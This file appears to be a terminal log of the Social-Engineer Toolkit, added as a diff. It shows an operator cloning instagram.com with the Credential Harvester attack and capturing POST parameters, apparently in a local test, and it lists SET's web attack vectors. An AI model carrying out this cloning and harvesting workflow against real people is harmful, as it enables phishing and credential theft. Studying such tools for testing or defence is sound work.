@@ -1,0 +1,691 @@
+
+                          _                                           J
+                         /-\                                          J
+                    _____|#|_____                                     J
+                   |_____________|                                    J
+                  |_______________|                                   E
+                 ||_POLICE_##_BOX_||                                  R
+                 | |-|-|-|||-|-|-| |                                  O
+                 | |-|-|-|||-|-|-| |                                  N
+                 | |_|_|_|||_|_|_| |                                  I
+                 | ||~~~| | |---|| |                                  M
+                 | ||~~~|!|!| O || |                                  O
+                 | ||~~~| |.|___|| |                                  O
+                 | ||---| | |---|| |                                  O
+                 | ||   | | |   || |                                  O
+                 | ||___| | |___|| |                                  !
+                 | ||---| | |---|| |                                  !
+                 | ||   | | |   || |                                  !
+                 | ||___| | |___|| |                                  !
+                 |-----------------|                                  !
+                 |   Timey Wimey   |                                  !
+                 -------------------                                  !
+
+[---]        The Social-Engineer Toolkit (SET)         [---]
+[---]        Created by: David Kennedy (ReL1K)         [---]
+                      Version: 8.0.3
+                    Codename: 'Maverick'
+[---]        Follow us on Twitter: @TrustedSec         [---]
+[---]        Follow me on Twitter: @HackingDave        [---]
+[---]       Homepage: https://www.trustedsec.com       [---]
+        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+   The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: https://www.trustedsec.com
+
+   It's easy to update using the PenTesters Framework! (PTF)
+Visit https://github.com/trustedsec/ptf to update all your tools!
+
+
+ Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) Wireless Access Point Attack Vector
+   8) QRCode Generator Attack Vector
+   9) Powershell Attack Vectors
+  10) Third Party Modules
+
+  99) Return back to the main menu.
+
+set> 2
+
+The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.
+
+The Java Applet Attack method will spoof a Java Certificate and deliver a Metasploit-based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.
+
+The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.
+
+The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.
+
+The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.
+
+The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if it's too slow/fast.
+
+The Multi-Attack method will add a combination of attacks through the web attack menu. For example, you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.
+
+The HTA Attack method will allow you to clone a site and perform PowerShell injection through HTA files which can be used for Windows-based PowerShell exploitation through the browser.
+
+   1) Java Applet Attack Method
+   2) Metasploit Browser Exploit Method
+   3) Credential Harvester Attack Method
+   4) Tabnabbing Attack Method
+   5) Web Jacking Attack Method
+   6) Multi-Attack Web Method
+   7) HTA Attack Method
+
+  99) Return to Main Menu
+
+set:webattack>3
+
+ The first method will allow SET to import a list of pre-defined web
+ applications that it can utilize within the attack.
+
+ The second method will completely clone a website of your choosing
+ and allow you to utilize the attack vectors within the completely
+ same web application you were attempting to clone.
+
+ The third method allows you to import your own website, note that you
+ should only have an index.html when using the import website
+ functionality.
+
+   1) Web Templates
+   2) Site Cloner
+   3) Custom Import
+
+  99) Return to Webattack Menu
+
+set:webattack>2
+[-] Credential harvester will allow you to utilize the clone capabilities within SET
+[-] to harvest credentials or parameters from a website as well as place them into a report
+
+-------------------------------------------------------------------------------
+--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---
+
+The way that this works is by cloning a site and looking for form fields to
+rewrite. If the POST fields are not usual methods for posting forms this
+could fail. If it does, you can always save the HTML, rewrite the forms to
+be standard forms and use the "IMPORT" feature. Additionally, really
+important:
+
+If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
+IP address below, not your NAT address. Additionally, if you don't know
+basic networking concepts, and you have a private IP address, you will
+need to do port forwarding to your NAT IP address from your external IP
+address. A browser doesn’t know how to communicate with a private IP
+address, so if you don't specify an external IP address if you are using
+this from an external perspective, it will not work. This isn't a SET issue
+this is how networking works.
+
+set:webattack> IP address for the POST back in Harvester/Tabnabbing [172.19.122.211]:  172.19.122.211
+[-] SET supports both HTTP and HTTPS
+[-] Example: http://www.thisisafakesite.com
+set:webattack> Enter the url to clone: https://instagram.com
+
+[*] Cloning the website: https://instagram.com
+[*] This could take a little bit...
+
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80
+[*] Information will be displayed to you as it arrives below:
+127.0.0.1 - - [09/Feb/2025 18:18:29] "GET / HTTP/1.1" 200 -
+[*] WE GOT A HIT! Printing the output:
+PARAM: event_id=7469485189478035843
+PARAM: marker_page_time=73
+PARAM: script_path=/
+PARAM: weight=0
+PARAM: client_start=1
+PARAM: lsd=AVpFdsJjVMU
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryCips3JXfqFtO7B86
+Content-Disposition: form-data; name="ts"
+
+1739124988026
+------WebKitFormBoundaryCips3JXfqFtO7B86
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"936619743392459","posts":[["falco:qe2_js_exposure",{"e":"{\"universe\":\"ig_web_lox_debug_2025_h1\",\"unit_id\":\"\",\"unit_type\":54,\"param\":\"log_page_view_critical_falco\"}","r":1,"d":"$^|AcaBEb62GBw5DdKKgOLrN3oTW5Er5xwzlxP5S2rO6UiYLaXXAxHm2Anruo3T7v2EkpgxQGEx5hnECVYS-TnYhb4A0w|4291D622-E3F3-429A-8A52-803A21EC8956","s":"cqjae2:agg3e8:iv6dz5","t":1739125044971.9502,"b":[1,128],"id":{"claim":""}},1739124988026.2,0,351]],"trigger":"falco:qe2_js_exposure","user":"0","webSessionId":"cqjae2:agg3e8:iv6dz5"}]
+------WebKitFormBoundaryCips3JXfqFtO7B86--
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryf3ulerYnuoLDxWCR
+Content-Disposition: form-data; name="ts"
+
+1739124988031
+------WebKitFormBoundaryf3ulerYnuoLDxWCR
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"936619743392459","posts":[["falco:qe2_js_exposure",{"e":"{\"universe\":\"ig_web_lox_debug_2025_h1\",\"unit_id\":\"\",\"unit_type\":54,\"param\":\"log_page_view_immediately\"}","r":1,"d":"$^|AcaBEb62GBw5DdKKgOLrN3oTW5Er5xwzlxP5S2rO6UiYLaXXAxHm2Anruo3T7v2EkpgxQGEx5hnECVYS-TnYhb4A0w|4291D622-E3F3-429A-8A52-803A21EC8956","s":"cqjae2:agg3e8:iv6dz5","t":1739125044977.75,"b":[1,128],"id":{"claim":""}},1739124988031.3,0,346]],"trigger":"falco:qe2_js_exposure","user":"0","webSessionId":"cqjae2:agg3e8:iv6dz5"}]
+------WebKitFormBoundaryf3ulerYnuoLDxWCR--
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+PARAM: av=0
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=3
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+PARAM: fb_api_caller_class=RelayModern
+PARAM: fb_api_req_friendly_name=QuickPromotionIGWebBatchFetchQuery
+PARAM: variables={"scale":1.25,"surface_nux_ids":["INSTAGRAM_FOR_WEB_LOGIN_INTERSTITIAL_QP"]}
+PARAM: server_timestamps=true
+PARAM: doc_id=7673355509443291
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+PARAM: av=0
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=4
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+PARAM: fb_api_caller_class=RelayModern
+PARAM: fb_api_req_friendly_name=QuickPromotionIGWebBatchFetchQuery
+PARAM: variables={"scale":1.25,"surface_nux_ids":["INSTAGRAM_WEB_MEGAPHONE","INSTAGRAM_FOR_WEB_INTERSTITIAL_QP","INSTAGRAM_FOR_WEB_TOOLTIP_QP"]}
+PARAM: server_timestamps=true
+PARAM: doc_id=7673355509443291
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+127.0.0.1 - - [09/Feb/2025 18:18:30] "GET /images/instagram/xig/homepage/screenshots/screenshot1.png?__d=www HTTP/1.1" 404 -
+127.0.0.1 - - [09/Feb/2025 18:18:30] "GET /images/instagram/xig/homepage/screenshots/screenshot2.png?__d=www HTTP/1.1" 404 -
+127.0.0.1 - - [09/Feb/2025 18:18:30] "GET /images/instagram/xig/homepage/screenshots/screenshot4.png?__d=www HTTP/1.1" 404 -
+127.0.0.1 - - [09/Feb/2025 18:18:30] "GET /images/instagram/xig/homepage/screenshots/screenshot3.png?__d=www HTTP/1.1" 404 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryuiV1Lo8C6zNig4Jj
+Content-Disposition: form-data; name="ts"
+
+1739124988224
+------WebKitFormBoundaryuiV1Lo8C6zNig4Jj
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"936619743392459","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"49336b71-6b79-468d-bc7c-4483b3159438\",\"ct\":1659080345,\"sjd\":\"AQhcG7pm3y4MvMrqJl8BuZ+4hMx5BDIhTolEa/QGtxOtvLg9YITS/C+shJ04vqurn13laj+JLZICPpKirxv486LsTtkK+3HHOnMYcyTEDyeiN4HjEwVnhZ6YXRiL6sYYsyUvn8M8VG1H3MCzqE2e+A==\",\"sid\":-1}","r":1,"d":"$^|AcaBEb62GBw5DdKKgOLrN3oTW5Er5xwzlxP5S2rO6UiYLaXXAxHm2Anruo3T7v2EkpgxQGEx5hnECVYS-TnYhb4A0w|4291D622-E3F3-429A-8A52-803A21EC8956","s":"cqjae2:agg3e8:iv6dz5","t":1739125045170.6501,"b":[1,128],"id":{"claim":""}},1739124988224.3,0,476]],"trigger":"falco:bd_pdc_signals","user":"0","webSessionId":"cqjae2:agg3e8:iv6dz5"}]
+------WebKitFormBoundaryuiV1Lo8C6zNig4Jj--
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+PARAM: route_urls[0]=/
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=6
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+PARAM: route_urls[0]=/legal/privacy/
+PARAM: route_urls[1]=/legal/terms/
+PARAM: route_urls[2]=/explore/locations/
+PARAM: route_urls[3]=/web/lite/
+PARAM: route_urls[4]=/accounts/meta_verified/?entrypoint=web_footer
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=7
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE PASSWORD FIELD FOUND: route_urls[0]=/accounts/password/reset/
+POSSIBLE USERNAME FIELD FOUND: route_urls[1]=/accounts/emailsignup/
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=8
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+----------------------------------------
+Exception occurred during processing of request from ('127.0.0.1', 37260)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
+    method()
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 303, in do_POST
+    url = urldecode(qs)
+          ^^^^^^^^^^^^^
+  File "/home/vedanti/social-engineer-toolkit/src/webattack/harvester/harvester.py", line 209, in urldecode
+    url = url.decode('utf-8')
+          ^^^^^^^^^^^^^^^^^^^
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0x9c in position 251: invalid start byte
+----------------------------------------
+[*] WE GOT A HIT! Printing the output:
+PARAM: route_urls[0]=/
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=a
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+PARAM: route_urls[0]=/legal/privacy/
+PARAM: route_urls[1]=/legal/terms/
+PARAM: route_urls[2]=/explore/locations/
+PARAM: route_urls[3]=/web/lite/
+PARAM: route_urls[4]=/accounts/meta_verified/?entrypoint=web_footer
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=b
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE PASSWORD FIELD FOUND: route_urls[0]=/accounts/password/reset/
+POSSIBLE USERNAME FIELD FOUND: route_urls[1]=/accounts/emailsignup/
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=c
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+PARAM: route_urls[0]=/
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=d
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+PARAM: route_urls[0]=/legal/privacy/
+PARAM: route_urls[1]=/legal/terms/
+PARAM: route_urls[2]=/explore/locations/
+PARAM: route_urls[3]=/web/lite/
+PARAM: route_urls[4]=/accounts/meta_verified/?entrypoint=web_footer
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=e
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
+PARAM: __dyn=7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Dz81s8hwGxu786a3a1YwBgao6C0Mo2swaOfK0EUjwGzEaE2iwNwmE2eUlwhE2Lw6OyES1TwVwDwHg2ZwrUdUbGweG269wr86C1mwPwUQp1yU426V89F8uwm85K0N9UKmVUC
+PARAM: __csr=gigDZihIJAf-FaiTVapbmAKUPaQQmHAFaiVpeQq4EC-EyieByUiga-KUizWXzoCFHESBFbAxu8Hy8CcxyUNz8oy8S8x28yeEbokGUy9ubUKawKwz-i6-9x25USVEWezovzU01f4AEgg38wzC4Ox62u1vwiU2yqx21tyF8bC0q-0gu0v-04CU0Ou48kUhCO0Kw7TzEm8VA9J15wlK0DEnwHG2w9750jonwto7_a5k0iO1uc01RFU0g8wfq
+PARAM: __comet_req=7
+PARAM: lsd=AVpFdsJjVMU
+PARAM: jazoest=2976
+POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019966700
+POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+POSSIBLE PASSWORD FIELD FOUND: __spin_t=1739125044
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE PASSWORD FIELD FOUND: route_urls[0]=/accounts/password/reset/
+POSSIBLE USERNAME FIELD FOUND: route_urls[1]=/accounts/emailsignup/
+PARAM: routing_namespace=igx_www
+PARAM: __d=www
+POSSIBLE USERNAME FIELD FOUND: __user=0
+PARAM: __a=1
+PARAM: __req=f
+PARAM: __hs=20128.HYP:instagram_web_pkg.2.1...0
+PARAM: dpr=2
+PARAM: __ccg=GOOD
+PARAM: __rev=1019966700
+PARAM: __s=cqjae2:agg3e8:iv6dz5
+PARAM: __hsi=7469485189478035843
